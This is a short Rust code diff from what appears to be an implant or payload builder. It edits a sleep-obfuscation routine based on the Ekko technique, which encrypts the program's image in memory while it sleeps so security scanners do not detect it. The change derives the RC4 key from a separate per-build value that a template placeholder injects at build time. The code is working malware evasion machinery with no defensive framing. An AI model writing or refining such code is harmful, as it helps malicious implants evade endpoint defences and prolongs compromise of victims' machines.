@@ -383,10 +383,11 @@ pub fn sleep_obfuscation() -> Result<bool, SleepObfuscationError> {
         return Err(SleepObfuscationError::CaptureContextFailed(WAIT_TIMEOUT));
     }
 
-    // 5. Build the continuation contexts. The RC4 key is the first 16 bytes
-    //    of the per-build XChaCha key, so the sleeping image is keyed per
-    //    build (the original Ekko hardcodes 0x55).
-    let mut key_bytes = hex::decode(&crate::KEY_HEX[..32])
+    // 5. Build the continuation contexts. The RC4 key is a fresh per-build key
+    //    (the original Ekko hardcodes 0x55); its hex form is rebuilt at runtime
+    //    by the injected definition below.
+    let sleep_key: String = $SLEEP_KEY_DEF$;
+    let mut key_bytes = hex::decode(&sleep_key[..32])
         .map_err(|_| SleepObfuscationError::CryptFunctionFailed(0))?;
     let key = UString::from_bytes(&mut key_bytes);
 
